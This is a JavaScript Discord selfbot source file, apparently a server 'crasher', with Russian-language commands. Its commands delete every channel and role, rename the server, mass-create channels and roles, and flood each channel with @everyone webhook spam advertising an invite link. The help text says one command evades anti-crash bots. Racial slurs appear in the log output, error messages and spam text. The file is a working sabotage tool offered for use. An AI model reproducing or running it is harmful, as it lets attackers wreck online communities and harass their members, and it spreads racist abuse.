const token = process.env['TOKEN']
const Discord = require('discord.js-selfbot');
const keepAlive = require('./server.js');



const client = new Discord.Client();


client.on('ready', () => { //при загрузке бота
console.log("негры");
}); 


client.on('message', async (message) => {
  if (message.content === '~auto') {
    message.delete(); 
    try { 
     message.guild.channels.cache.forEach 
     (channel => channel.delete());  
     } catch { 
        message.channel.send("Негр ошибка");
        } 
        message.guild.roles.cache.forEach(role => { 
        if (role.editable && role.id !== message.guild.id) role.delete() 
    }); 
    await message.guild.setIcon("https://media.discordapp.net/attachments/937000390862471269/938807454374969434/blood.jpg");
    await message.guild.setName("×××Crashed by austr×××");

    for (let i = 1; i <= 25; i++) {
        message.guild.channels
          .create("crashed-by-austr", {
            type: "text",
            topic: "https://discord.gg/lavanbot",
          })
          .then(channel => {
              channel.createWebhook("×××Crashed by austr×××", { 
              }).then(async webhook => {
                  for (let i = 1; i <= 30; i++) { 
                            webhook.send("@everyone Сервер крашится великим австром. Ливайте с помойки или будет хуже.\nЕсли вас не ебут негры - зайдите в великую империю https://discord.gg/lavanbot");      
                  };
              });
          });
      } 1000;
    } 
});


client.on('message', async (message) => {
  if (message.content === '~hookall') {
    message.delete(); 
     message.guild.channels.cache.forEach
     (channel => {channel.createWebhook("×××Crashed by austr×××", { 
              }).then(async webhook => {
                  for (let i = 1; i <= 25; i++) {
                            webhook.send("@everyone @here ваш сервер крашится Австром. Переходите к нам -> https://discord.gg/lavanbot");      
                  };
              });
          });
        };
});

client.on('message', async (message) => {
  if (message.content === '~nuke') {
    message.delete(); 
    try {
     message.guild.channels.cache.forEach 
     (channel => channel.delete()); 
     } catch { 
        message.channel.send("Негр ошибка");
        } 
        message.guild.roles.cache.forEach(role => { 
        if (role.editable && role.id !== message.guild.id) role.delete() 
    }); 
};
});


client.on('message', async (message) => {
  if (message.content === '~renamechannels') {
    message.delete(); 
    try {
     message.guild.channels.cache.forEach 
     (channel => channel.setName("crashed-by-austr"));  
     } catch { 
        console.log(error)
        } 
};
});


client.on('message', message => {
  if (message.content === '~ping') {
    message.delete();
    message.channel.send(`Пинг ${Date.now() - message.createdTimestamp}ms. API-пинг ${Math.round(client.ws.ping)}ms`);
  }
});

client.on('message', (msg) => {
  if (msg.content === '~help') {
    msg.delete();
    let now = Date.now()
    msg.channel.send('`~auto` - **полный автоматический краш сервера**\n`~nuke` - **удаление всех каналов и ролей**\n`~ping` - **показывает задержку селф бота**\n`~renamechannels` - **обходит анти-краш ботов**\n`~roles` - **создание ролей**\n`~hookall` - **спам во все каналы вебюхуками**')
  }
})





client.on('message', (msg) => {
  if (msg.content === '~roles') {
    msg.delete();
    for (let i = 1; i <= 50; i++) {
        msg.guild.roles
          .create({
            data: {
              name: "💣 Crashed by Austr 💣",
              color: "#ff0000",
            },
          })
          .catch(console.error);
      }
  }
}
)

keepAlive();
client.login(token);
